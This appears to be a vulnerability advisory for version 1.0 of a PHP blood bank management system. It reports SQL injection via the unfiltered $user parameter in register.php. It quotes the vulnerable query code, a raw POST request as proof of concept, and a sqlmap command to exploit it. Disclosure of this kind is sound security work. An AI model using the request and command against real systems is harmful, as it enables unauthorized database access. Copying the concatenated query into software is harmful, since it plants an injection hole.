# blood-bank-system-in-php register.php $user via sql injection

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

register.php ，$user parameter.

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection,remote network.

## Root Cause

In register.php , SQL injection is used to obtain database information via $user parameter.

## Impact

## **Description of the vulnerability**

### register.php

In the source code，the    $user parameter is not filtered and concatenated into the SQL statement.        

```
$user=$_POST['user'];
$password=$_POST['pass'];
$useremail=$_POST['useremail'];
$bloodgroup=$_POST['bloodgroup'];
$gender=$_POST['gender'];
$s = "select * from login where user= '$user'";
```

​                                                                                                                                                                                                                                                                                                                                                                                                                      

![image-20241003222909465](https://github.com/user-attachments/assets/8f54c7a6-5369-4351-a4f7-64e34785583f)



## **Vulnerability recurrence**

### **POC**

```
POST /register.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/successfull.html
Cookie: PHPSESSID=0ci9v3uj72cq2svdhvu3cl6nuh
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=1
```

save as 1.txt

excute the command.

```
python sqlmap.py -r "1.txt" 
```

![image-20241003222827958](https://github.com/user-attachments/assets/9b8f4d74-4a26-4711-a11a-374be0c29097)

